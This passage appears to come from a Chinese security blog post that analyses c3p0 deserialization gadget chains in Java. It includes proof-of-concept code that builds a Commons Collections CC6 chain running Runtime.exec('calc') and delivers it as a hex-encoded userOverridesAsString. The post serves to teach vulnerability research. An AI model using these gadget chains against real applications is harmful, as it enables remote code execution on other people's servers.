+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="kt">int</span> <span class="nf">getLoginTimeout</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="nx">Override</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">public</span> <span class="nx">Logger</span> <span class="nf">getParentLogger</span><span class="p">()</span> <span class="nx">throws</span> <span class="nx">SQLFeatureNotSupportedException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">PoolBackedDataSourceBase</span> <span class="nx">pds</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">PoolBackedDataSourceBase</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Class</span> <span class="nx">cl</span> <span class="p">=</span> <span class="nx">Class</span><span class="p">.</span><span class="nf">forName</span><span class="p">(</span><span class="s">&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Field</span> <span class="nx">connectionPoolDataSourceField</span> <span class="p">=</span> <span class="nx">cl</span><span class="p">.</span><span class="nf">getDeclaredField</span><span class="p">(</span><span class="s">&#34;connectionPoolDataSource&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">connectionPoolDataSourceField</span><span class="p">.</span><span class="nf">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">connectionPoolDataSourceField</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">pds</span><span class="p">,</span> <span class="nx">new</span> <span class="nf">exp</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">Unser</span><span class="p">(</span><span class="nx">pds</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">Unser</span><span class="p">(</span><span class="nx">Object</span> <span class="nx">obj</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span><span class="p">,</span> <span class="nx">ClassNotFoundException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ByteArrayOutputStream</span> <span class="nx">bos</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ByteArrayOutputStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ObjectOutputStream</span> <span class="nx">oos</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectOutputStream</span><span class="p">(</span><span class="nx">bos</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">oos</span><span class="p">.</span><span class="nf">writeObject</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ByteArrayInputStream</span> <span class="nx">bis</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ByteArrayInputStream</span><span class="p">(</span><span class="nx">bos</span><span class="p">.</span><span class="nf">toByteArray</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ObjectInputStream</span> <span class="nx">ois</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectInputStream</span><span class="p">(</span><span class="nx">bis</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ois</span><span class="p">.</span><span class="nf">readObject</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="总结-1" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>url 链的不出网打法，但是需要 tomcat8 的依赖</p>
+<h3 id="hex-base" class="heading-element"><span>hex base</span>
+  <a href="#hex-base" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="调用链-2" class="heading-element"><span>调用链</span>
+  <a href="#%e8%b0%83%e7%94%a8%e9%93%be-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>如果不出网，而且是fastjson或jackson的情况，可以用这个Gadget，该利用链能够反序列化一串十六进制字符串，因此实际利用需要有存在反序列化漏洞的组件</p>
+<p>定位到 <code>com.mchange.v2.c3p0.impl</code> 下的 <code>WrapperConnectionPoolDataSource</code> 类中</p>
+<p>其构造函数调用了 <code>C3P0ImplUtils.parseUserOverridesAsString</code> 方法</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec45ab83.png" alt="image-20250316164856585" srcset="https://bu.dusays.com/2025/03/18/67d95ec45ab83.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec45ab83.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec45ab83.png?size=large 2x" data-title="image-20250316164856585" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException {
+</span></span><span class="line"><span class="cl">        if (userOverridesAsString != null) {
+</span></span><span class="line"><span class="cl">            String hexAscii = userOverridesAsString.substring(&#34;HexAsciiSerializedMap&#34;.length() + 1, userOverridesAsString.length() - 1);
+</span></span><span class="line"><span class="cl">            byte[] serBytes = ByteUtils.fromHexAscii(hexAscii);
+</span></span><span class="line"><span class="cl">            return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes));
+</span></span><span class="line"><span class="cl">        } else {
+</span></span><span class="line"><span class="cl">            return Collections.EMPTY_MAP;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先是调用 <code>fromHexAscii</code>将其传入的 <code>userOverridesAsString</code> 16进制解码，再用 <code>fromByteArray</code> 将其转换为map类，其输入必须满足<code>HexAsciiSerializedMap{xxx}</code> 的格式，其中<code>{</code>和<code>}</code>用其他任意字符代替均可</p>
+<p>跟进看下 <code>fromByteArray</code> 的实现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">public</span> <span class="k">static</span> <span class="ne">Object</span> <span class="n">fromByteArray</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">var0</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ClassNotFoundException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="ne">Object</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">deserializeFromByteArray</span><span class="p">(</span><span class="n">var0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">var1</span> <span class="n">instanceof</span> <span class="n">IndirectlySerialized</span> <span class="err">?</span> <span class="p">((</span><span class="n">IndirectlySerialized</span><span class="p">)</span><span class="n">var1</span><span class="p">)</span><span class="o">.</span><span class="n">getObject</span><span class="p">()</span> <span class="p">:</span> <span class="n">var1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>触发了 <code>deserializeFromByteArray</code> 方法，然后判断反序列化后的对象 <code>var1</code> 是否是 <code>IndirectlySerialized</code> 类型，如果是则调用其 <code>getObject</code> 方法，如果不是则直接返回 <code>var1</code></p>
+<p>继续跟进 <code>deserializeFromByteArray</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">public</span> <span class="k">static</span> <span class="ne">Object</span> <span class="n">deserializeFromByteArray</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">var0</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ClassNotFoundException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">var0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="n">readObject</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里直接反序列化了</p>
+<p>ok 看下怎么传参，参数是由 <code>getUserOverridesAsString()</code> 方法获得的，可以用其 setter 方法来赋值</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec4710ff.png" alt="image-20250316202100033" srcset="https://bu.dusays.com/2025/03/18/67d95ec4710ff.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec4710ff.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec4710ff.png?size=large 2x" data-title="image-20250316202100033" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="poc-2" class="heading-element"><span>poc</span>
+  <a href="#poc-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>随便拿条链子，我这里拿cc6，相较于其他cc链，cc6用的更多一点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">org</span><span class="p">.</span><span class="nx">example</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">com</span><span class="p">.</span><span class="nx">mchange</span><span class="p">.</span><span class="nx">v2</span><span class="p">.</span><span class="nx">c3p0</span><span class="p">.</span><span class="nx">WrapperConnectionPoolDataSource</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">Transformer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ChainedTransformer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ConstantTransformer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">InvokerTransformer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">keyvalue</span><span class="p">.</span><span class="nx">TiedMapEntry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="kd">map</span><span class="p">.</span><span class="nx">LazyMap</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">HashMap</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Map</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">reflect</span><span class="p">.</span><span class="nx">Field</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">c3p0_hexbase</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span><span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">Transformer</span><span class="p">[]</span> <span class="nx">transformers</span> <span class="p">=</span> <span class="nx">new</span> <span class="nx">Transformer</span><span class="p">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">new</span> <span class="nf">ConstantTransformer</span><span class="p">(</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">class</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Class</span><span class="p">[].</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span> <span class="nx">null</span><span class="p">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">Object</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Object</span><span class="p">[].</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]{</span><span class="nx">null</span><span class="p">,</span> <span class="nx">null</span><span class="p">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">ChainedTransformer</span> <span class="nx">cha</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ChainedTransformer</span><span class="p">(</span><span class="nx">transformers</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">HashMap</span><span class="p">&lt;</span><span class="nx">Object</span><span class="p">,</span> <span class="nx">Object</span><span class="p">&gt;</span> <span class="kd">map</span> <span class="p">=</span> <span class="nx">new</span> <span class="nx">HashMap</span><span class="p">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Map</span><span class="p">&lt;</span><span class="nx">Object</span><span class="p">,</span> <span class="nx">Object</span><span class="p">&gt;</span> <span class="nx">Lazy</span> <span class="p">=</span> <span class="nx">LazyMap</span><span class="p">.</span><span class="nf">decorate</span><span class="p">(</span><span class="kd">map</span><span class="p">,</span><span class="nx">new</span> <span class="nf">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">TiedMapEntry</span> <span class="nx">Tie</span><span class="p">=</span><span class="nx">new</span> <span class="nf">TiedMapEntry</span><span class="p">(</span><span class="nx">Lazy</span><span class="p">,</span><span class="s">&#34;aaa&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">HashMap</span><span class="p">&lt;</span><span class="nx">Object</span><span class="p">,</span><span class="nx">Object</span><span class="p">&gt;</span> <span class="nx">hashmap</span> <span class="p">=</span> <span class="nx">new</span> <span class="nx">HashMap</span><span class="p">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">hashmap</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="nx">Tie</span><span class="p">,</span><span class="s">&#34;test&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Class</span><span class="p">&lt;</span><span class="nx">LazyMap</span><span class="p">&gt;</span> <span class="nx">lazyMapClass</span> <span class="p">=</span> <span class="nx">LazyMap</span><span class="p">.</span><span class="nx">class</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Field</span> <span class="nx">factoryField</span> <span class="p">=</span> <span class="nx">lazyMapClass</span><span class="p">.</span><span class="nf">getDeclaredField</span><span class="p">(</span><span class="s">&#34;factory&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">factoryField</span><span class="p">.</span><span class="nf">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">factoryField</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">Lazy</span><span class="p">,</span> <span class="nx">cha</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Lazy</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="s">&#34;aaa&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">serilize</span><span class="p">(</span><span class="nx">hashmap</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">InputStream</span> <span class="nx">in</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">FileInputStream</span><span class="p">(</span><span class="s">&#34;test.bin&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="nx">bytein</span> <span class="p">=</span> <span class="nf">toByteArray</span><span class="p">(</span><span class="nx">in</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">String</span> <span class="nx">Hex</span> <span class="p">=</span> <span class="s">&#34;HexAsciiSerializedMap{&#34;</span><span class="o">+</span><span class="nf">bytesToHexString</span><span class="p">(</span><span class="nx">bytein</span><span class="p">,</span><span class="nx">bytein</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="o">+</span><span class="s">&#34;}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">WrapperConnectionPoolDataSource</span> <span class="nx">exp</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">WrapperConnectionPoolDataSource</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exp</span><span class="p">.</span><span class="nf">setUserOverridesAsString</span><span class="p">(</span><span class="nx">Hex</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">serilize</span><span class="p">(</span><span class="nx">Object</span> <span class="nx">obj</span><span class="p">)</span><span class="nx">throws</span> <span class="nx">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ObjectOutputStream</span> <span class="nx">out</span><span class="p">=</span><span class="nx">new</span> <span class="nf">ObjectOutputStream</span><span class="p">(</span><span class="nx">new</span> <span class="nf">FileOutputStream</span><span class="p">(</span><span class="s">&#34;test.bin&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">out</span><span class="p">.</span><span class="nf">writeObject</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//将输入流转换为字节数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">public</span> <span class="nx">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">toByteArray</span><span class="p">(</span><span class="nx">InputStream</span> <span class="nx">in</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="nx">classBytes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">classBytes</span> <span class="p">=</span> <span class="nx">new</span> <span class="kt">byte</span><span class="p">[</span><span class="nx">in</span><span class="p">.</span><span class="nf">available</span><span class="p">()];</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">in</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">classBytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">in</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">classBytes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//将字节数组转换为十六进制
